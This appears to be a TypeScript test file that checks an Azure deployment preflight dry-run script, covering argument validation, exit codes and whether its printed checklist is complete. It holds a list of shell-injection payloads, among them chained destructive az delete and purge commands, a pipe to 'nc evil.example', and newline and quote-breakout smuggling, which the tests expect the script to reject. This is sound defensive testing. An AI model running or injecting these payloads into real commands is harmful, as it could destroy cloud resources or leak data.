// R2-D1 — Azure drill scripts
//
// Adversarial coverage for deploy/azure-preflight-dry-run.mjs: the go/no-go
// preflight checklist printer (PF-01..PF-12). Round-1 sweep lanes and all
// adv-/sec-/finding-/deferred- files cover the web/API/engine/adapter
// surfaces and never touch deploy/*.mjs (verified by repository-wide grep);
// this lane duplicates nothing.
//
// Attacks here: argv injection into the interpolated az command strings,
// missing/flag-swallowing values, unknown-flag handling, exit codes, and
// checklist completeness vs docs/operations/azure-preflight-and-bootstrap.md.
// Live-mode spawn gating is covered separately in
// r2-d1-azure-drills-live-gating.test.ts. Hermetic: this file never passes
// --live, so nothing is spawned.
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { readFileSync } from "node:fs";
import { promisify } from "node:util";
import test from "node:test";

const execFileAsync = promisify(execFile);
const SCRIPT = new URL("../../deploy/azure-preflight-dry-run.mjs", import.meta.url).pathname;

interface ScriptResult {
  code: number;
  stdout: string;
  stderr: string;
}

async function runScript(args: readonly string[]): Promise<ScriptResult> {
  try {
    const { stdout, stderr } = await execFileAsync(process.execPath, [SCRIPT, ...args], {
      timeout: 20_000,
      maxBuffer: 10 * 1024 * 1024,
    });
    return { code: 0, stdout, stderr };
  } catch (error) {
    const failure = error as { code?: unknown; stdout?: unknown; stderr?: unknown };
    assert.equal(typeof failure.code, "number", `the script must exit with a numeric code, got ${String(failure.code)}`);
    return {
      code: failure.code as number,
      stdout: typeof failure.stdout === "string" ? failure.stdout : "",
      stderr: typeof failure.stderr === "string" ? failure.stderr : "",
    };
  }
}

// Shell-metacharacter payloads that previously interpolated verbatim into the
// printed az command strings (e.g. `az acr check-name-availability --name
// "${prefix}acr"`), producing executable-looking mutations or breaking out of
// the quoted JMESPath query in PF-11.
const INJECTION_PAYLOADS: ReadonlyArray<readonly [string, string]> = [
  ["command separator", "x; az keyvault delete --name kv"],
  ["list separator", "x && az group delete --name rg"],
  ["pipe exfiltration shape", "x | nc evil.example 443"],
  ["command substitution", "$(az ad app delete --id 1)"],
  ["backtick substitution", "`az keyvault purge`"],
  ["double-quote breakout", 'x" --query y "'],
  ["single-quote breakout (PF-11 JMESPath escape)", "x']]|[?@=='x"],
  ["newline smuggling", "x\naz role assignment create"],
  ["carriage-return smuggling", "x\r--malicious"],
  ["backslash escape", "x\\\";rm"],
  ["ANSI escape sequence", "x\u001b[31m"],
  ["leading whitespace", " x"],
  ["trailing whitespace", "x "],
  ["tab inside value", "x\ty"],
  ["empty value", ""],
];

test("R2-D1 preflight: shell-metacharacter --prefix/--rg payloads fail closed before any output", async () => {
  for (const flag of ["--prefix", "--rg"] as const) {
    for (const [label, payload] of INJECTION_PAYLOADS) {
      const { code, stdout, stderr } = await runScript([flag, payload]);
      assert.equal(code, 2, `${flag} ${label}: must exit 2`);
      assert.equal(stdout, "", `${flag} ${label}: nothing may be printed before validation fails`);
      assert.ok(stderr.startsWith("azure-preflight-dry-run: "), `${flag} ${label}: bounded stderr names the script`);
      assert.ok(stderr.includes(flag), `${flag} ${label}: stderr names the offending flag`);
      assert.ok(!stderr.includes("at "), `${flag} ${label}: no stack trace leaks into stderr`);
      assert.ok((payload === "" || !stdout.includes(payload)) && !stderr.includes("az keyvault delete --name kv"), `${flag} ${label}: payload never reaches a printed az command`);
    }
  }
});

test("R2-D1 preflight: flag-looking and missing values fail closed", async () => {
  const cases: Array<readonly [string, string[]]> = [
    ["trailing --prefix with no value", ["--prefix"]],
    ["trailing --rg with no value", ["--rg"]],
    ["--prefix swallows the next flag as its value", ["--prefix", "--live"]],
    ["--rg swallows the next flag as its value", ["--rg", "--prefix"]],
  ];
  for (const [label, args] of cases) {
    const { code, stdout, stderr } = await runScript(args);
    assert.equal(code, 2, `${label}: must exit 2 (previously defaulted silently)`);
    assert.equal(stdout, "", `${label}: no checklist may be printed`);
    assert.match(stderr, /requires a value/u, `${label}: stderr explains the missing value`);
  }
});

test("R2-D1 preflight: unknown flags fail closed instead of being silently ignored", async () => {
  // A typo like --liv previously left the script in dry-run with no warning;
  // --rgx silently discarded the resource-group override.
  for (const args of [["--bogus"], ["--liv"], ["--rgx", "real-rg"], ["--prefix=p"]] as const) {
    const { code, stdout, stderr } = await runScript([...args]);
    assert.equal(code, 2, `${args.join(" ")}: must exit 2`);
    assert.equal(stdout, "", `${args.join(" ")}: nothing printed before the flag check`);
    assert.match(stderr, /unknown flag/u, `${args.join(" ")}: stderr names the unknown flag`);
  }
});

test("R2-D1 preflight: dry-run prints the complete PF-01..PF-12 checklist per the operations doc", async () => {
  const { code, stdout, stderr } = await runScript([]);
  assert.equal(code, 0, "dry-run with defaults succeeds");
  assert.equal(stderr, "", "dry-run prints nothing to stderr");

  // All twelve IDs, in order, exactly once each (doc section 2 table).
  const ids = [...stdout.matchAll(/\[(PF-\d{2})\]/gu)].map((m) => m[1]);
  assert.deepEqual(ids, Array.from({ length: 12 }, (_, i) => `PF-${String(i + 1).padStart(2, "0")}`), "PF-01..PF-12 appear in order exactly once");

  // Every check carries the four gate fields the doc's evidence rules require.
  for (const id of ids) {
    const section = stdout.slice(stdout.indexOf(`[${id}]`));
    assert.match(section, /\$ az |\$ gh /u, `${id} prints at least one read-only command`);
    assert.match(section, /pass criterion: .+/u, `${id} states a pass criterion`);
    assert.match(section, /evidence: .+/u, `${id} states retained evidence`);
    assert.match(section, /fail action: ABORT/u, `${id} fails closed with ABORT`);
  }

  // Read-only verb discipline across every printed command line: strip flags
  // and flag values, then the second remaining token is the az verb.
  for (const line of stdout.split("\n")) {
    if (!line.trimStart().startsWith("$ az ")) continue;
    const tokens: string[] = [];
    let skipNext = false;
    for (const token of line.trimStart().slice("$ az ".length).split(" ")) {
      if (skipNext) { skipNext = false; continue; }
      if (token.startsWith("-")) { skipNext = true; continue; }
      tokens.push(token);
    }
    const verbTokens = tokens.slice(1, 3);
    assert.ok(/^(show|list|list-locations|check-name-availability|query)$/u.test(verbTokens[verbTokens.length - 1] ?? ""), `printed az command must be read-only, got "az ${tokens.join(" ")}"`);
  }

  assert.match(stdout, /DRY-RUN \(nothing executed\)/u, "dry-run mode banner");
  assert.match(stdout, /no command was executed/u, "dry-run completion statement");
  assert.match(stdout, /All 12 checks must pass/u, "summary counts all twelve checks");
});

test("R2-D1 preflight: supplied --prefix/--rg substitute into exactly the doc-mandated commands", async () => {
  const { code, stdout } = await runScript(["--prefix", "demo01", "--rg", "poc-rg"]);
  assert.equal(code, 0);
  assert.match(stdout, /az acr check-name-availability --name "demo01acr"/u, "PF-03/PF-07 ACR name uses the prefix");
  assert.match(stdout, /az resource show --resource-group "poc-rg" --name "demo01-app" --resource-type Microsoft\.App\/containerApps/u, "PF-03 app probe uses rg + prefix");
  assert.match(stdout, /az budget show --name "demo01-budget"/u, "PF-04 budget name uses the prefix");
  assert.match(stdout, /az keyvault check-name-availability --name "demo01kv"/u, "PF-08 vault name uses the prefix");
  assert.match(stdout, /az resource list --query "\[\?resourceGroup=='poc-rg'\]"/u, "PF-11 cleanup query uses the rg");
  assert.ok(stdout.includes('"PREFIX"') === false, "the placeholder prefix is fully substituted");
});

test("R2-D1 preflight: valid resource-name shapes are admitted", async () => {
  for (const value of ["a", "a1", "poc-rg", "with_underscore", "X9-z_"]) {
    const { code } = await runScript(["--prefix", value, "--rg", value]);
    assert.equal(code, 0, `value ${JSON.stringify(value)} must be accepted`);
  }
});

test("R2-D1 preflight: source admits only the documented flags and never spawns a shell", () => {
  const source = readFileSync(SCRIPT, "utf8");
  assert.match(source, /KNOWN_FLAGS = new Set\(\["--live", "--prefix", "--rg"\]\)/u, "flag allow-list stays in sync with the usage line");
  assert.ok(!/spawn\([^)]*\{[^}]*shell/u.test(source), "no shell:true spawn option anywhere");
  assert.ok(!source.includes("execSync") && !source.includes("execFile("), "no exec-family spawn (shell-string APIs)");
});
